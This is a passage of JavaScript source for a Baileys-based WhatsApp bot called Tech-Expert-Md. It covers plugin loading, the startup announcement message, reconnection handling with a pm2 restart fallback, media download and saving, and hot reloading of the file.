                    if (path.extname(fichier).toLowerCase() == ".js") {
                        try {
                            require(path.join(__dirname, "/plugins/" + fichier));
                            console.log(fichier + "🛒🔑 Tech-Expert-Md plugins Installed Successfully✔️");
                        } catch (e) {
                            console.log(`${fichier} could not be installed due to : ${e}`);
                        }
                        baileysDelay(300);
                    }
                });
                
                await baileysDelay(700);
                var md;
                if ((conf.MODE).toLowerCase() === "yes") {
                    md = "public";
                } else if ((conf.MODE).toLowerCase() === "no") {
                    md = "private";
                } else {
                    md = "undefined";
                }
                console.log("🏆🗡️ Tech-Expert-Md Plugins Installation Completed ✅");

                // Send connection message
                if((conf.DP).toLowerCase() === 'yes') {     
                    let cmsg = `HELLO👋, BOT CONNECTED✅😇⁠⁠⁠⁠

╭════⊷
║ *『 ${conf.BOT} IS ONLINE』*
║    Creator: *${conf.OWNER_NAME}*
║    Prefix : [  ${prefixe} ]
║    Mode : ${md} mode
║    Total Commands : ${evt.cm.length}
╰──────────────────⊷
`;
                    await zk.sendMessage(zk.user.id, { text: cmsg });
                }
            } else if (connection == "close") {
                let raisonDeconnexion = new Boom(lastDisconnect?.error)?.output.statusCode;
                if (raisonDeconnexion === DisconnectReason.badSession) {
                    console.log('Session id error, rescan again...');
                } else if (raisonDeconnexion === DisconnectReason.connectionClosed) {
                    console.log('!!! connection closed, reconnection in progress...');
                    main();
                } else if (raisonDeconnexion === DisconnectReason.connectionLost) {
                    console.log('connection error 😞,,, trying to reconnect... ');
                    main();
                } else if (raisonDeconnexion === DisconnectReason?.connectionReplaced) {
                    console.log('connection replaced ,,, a session is already open please close it !!!');
                } else if (raisonDeconnexion === DisconnectReason.loggedOut) {
                    console.log('you are disconnected,,, please rescan the qr code please');
                } else if (raisonDeconnexion === DisconnectReason.restartRequired) {
                    console.log('reboot in progress ▶️');
                    main();
                } else {
                    console.log('redemarrage sur le coup de l\'erreur  ',raisonDeconnexion);
                    const {exec} = await import('child_process');
                    exec("pm2 restart all");
                }
                console.log("hum " + connection);
                main();
            }
        });

        // Download utility function
        zk.downloadAndSaveMediaMessage = async (message, filename = '', attachExtension = true) => {
            let quoted = message.msg ? message.msg : message;
            let mime = (message.msg || message).mimetype || '';
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
            const stream = await downloadContentFromMessage(quoted, messageType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            let type = await fileTypeFromBuffer(buffer);
            let trueFileName = './' + filename + '.' + type.ext;
            await fs.writeFileSync(trueFileName, buffer);
            return trueFileName;
        };

        return zk;
    }
    
    let fichier = require.resolve(__filename);
    fs.watchFile(fichier, () => {
        fs.unwatchFile(fichier);
        console.log(`mise à jour ${__filename}`);
        delete require.cache[fichier];
        require(fichier);
    });
    
    main();
}, 5000);